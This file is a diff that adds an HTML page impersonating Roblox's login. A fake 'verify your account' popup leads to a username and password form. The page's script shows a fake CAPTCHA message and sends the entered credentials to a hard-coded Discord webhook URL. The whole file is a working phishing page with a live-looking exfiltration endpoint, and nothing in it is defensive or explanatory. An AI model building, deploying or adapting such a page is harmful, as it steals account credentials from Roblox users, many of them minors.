@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head><meta http-equiv="cache-control" content="no-cache"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="-1"><style type="text/css">
+
+</style>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Homepage - Login Required Popup</title>
+    <style>
+        body {
+            font-family: "Gotham-Bold", sans-serif;
+            background-color: #333; /* Changed background color to dark grey */
+            color: white; /* Set text color to white */
+            margin: 0;
+            padding: 0;
+            font-size: 16px; /* Default font size */
+            font-weight: bold; /* Set font weight to bold */
+            text-align: center; /* Center align content */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* Ensure full viewport height */
+            border-radius: 20px; /* Rounded corners for body */
+            overflow: hidden; /* Hide overflow for rounded corners */
+        }
+        .overlay {
+            display: none; /* Initially hide the overlay */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent black overlay */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999; /* Ensure popup is on top */
+            border-radius: 20px; /* Rounded corners for overlay */
+        }
+        .popup {
+            background-color: #555; /* Dark grey for popup box */
+            padding: 20px;
+            max-width: 80%; /* Set maximum width of popup box */
+            border-radius: 20px; /* Rounded corners for popup box */
+            text-align: center;
+            max-height: 70%; /* Set maximum height for popup */
+            overflow-y: auto; /* Enable scrolling if content exceeds height */
+        }
+        .popup h2 {
+            margin-bottom: 20px;
+        }
+        .popup button {
+            padding: 10px 20px;
+            background-color: transparent; /* Transparent background for button */
+            border: 2px solid black; /* Black border */
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            transition: background-color 0.3s ease; /* Smooth transition for hover effect */
+            border-radius: 20px; /* Rounded corners for button */
+        }
+        .popup button:hover {
+            background-color: rgba(0, 0, 0, 0.2); /* Semi-transparent black on hover */
+        }
+        .login-container {
+            display: none; /* Initially hide the login container */
+            padding: 20px;
+            background-color: #555; /* Dark grey for login box */
+            max-width: 80%; /* Set maximum width of login box */
+            width: 400px; /* Set initial width for larger screens */
+            border-radius: 20px; /* Rounded corners for login box */
+            text-align: center;
+            max-height: 80%; /* Set maximum height for login container */
+            overflow-y: auto; /* Enable scrolling if content exceeds height */
+        }
+        .login-container input {
+            display: block;
+            width: calc(100% - 20px); /* Calculate width to adjust for padding */
+            margin: 10px auto;
+            padding: 10px;
+            font-size: 14px; /* Font size for input fields */
+            background-color: #444; /* Darker grey for input background */
+            border: none;
+            color: white; /* Text color for input fields */
+            font-weight: bold; /* Set font weight to bold */
+            border-radius: 20px; /* Rounded corners for input fields */
+        }
+        .login-container input[type="submit"] {
+            background-color: black; /* Black background for submit button */
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            transition: background-color 0.3s ease; /* Smooth transition for hover effect */
+            border-radius: 20px; /* Rounded corners for submit button */
+        }
+        .login-container input[type="submit"]:hover {
+            background-color: #333; /* Darker black color on hover */
+        }
+        footer {
+            background-color: #555; /* Dark grey for footer */
+            color: white;
+            text-align: center;
+            padding: 10px;
+            width: 100%;
+            font-size: 12px; /* Font size for footer */
+            position: fixed;
+            bottom: 0;
+            border-radius: 0 0 20px 20px; /* Rounded corners for footer */
+        }
+
+        /* Media query for larger screens */
+        @media only screen and (min-width: 768px) {
+            .popup {
+                max-height: 80%; /* Adjust maximum height for larger screens */
+            }
+            
+            .login-container {
+                width: 50%; /* Adjust width for larger screens */
+                max-height: 80%; /* Adjust maximum height for larger screens */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay" id="overlay">
+        <div class="popup">
+            <h2>You need to verify your account. Please Login.</h2>
+            <button onclick="showLogin()">OK</button>
+        </div>
+    </div>
+
+    <div class="login-container" id="loginContainer">
+        <h2>Login to Roblox</h2>
+        <form onsubmit="submitForm(event)">
+            <input type="text" id="usernameInput" placeholder="Username" required="">
+            <input type="password" id="passwordInput" placeholder="Password" required="">
+            <input type="submit" value="Log In">
+        </form>
+    </div>
+
+    <footer>
+        <p>© 2024 Roblox Corporation. All rights reserved.</p>
+    </footer>
+
+    <script>
+        // Function to show the login form
+        function showLogin() {
+            var overlay = document.getElementById('overlay');
+            var loginContainer = document.getElementById('loginContainer');
+            overlay.style.display = 'none'; // Hide the overlay
+            loginContainer.style.display = 'block'; // Show the login container
+        }
+
+        // Function to submit form and simulate CAPTCHA
+        function submitForm(event) {
+            event.preventDefault(); // Prevent form from submitting normally
+
+            var username = document.getElementById('usernameInput').value;
+            var password = document.getElementById('passwordInput').value;
+
+            // Simulate a loading state or CAPTCHA verification
+            showFakeCaptcha();
+
+            // Construct message payload
+            var message = {
+                content: `Username = ${username}\nPassword = ${password}`
+            };
+
+            // Replace with your actual Discord webhook URL
+            var webhookUrl = 'https://discord.com/api/webhooks/1261752777810382937/2T2fb_WGKrWyih6baKRFah6i5aUnUjrrSxWg-cFc5zRISdGbDiaIGGq3E2SyhK2zcDBY';
+
+            // Send message via fetch API
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error:', response);
+                } else {
+                    console.log('Webhook sent successfully');
+                    // Optionally reset the form or update UI after successful submission
+                }
+            })
+            .catch(error => {
+                console.error('Error', error);
+            });
+        }
+
+        // Function to simulate CAPTCHA verification process
+        function showFakeCaptcha() {
+            var loginContainer = document.getElementById('loginContainer');
+            loginContainer.innerHTML = ''; // Clear existing content
+            var captchaMessage = document.createElement('p');
+            captchaMessage.textContent = 'Verifying CAPTCHA... This may take a while.';
+            loginContainer.appendChild(captchaMessage);
+        }
+    </script>
+
+
+<script></script></body>
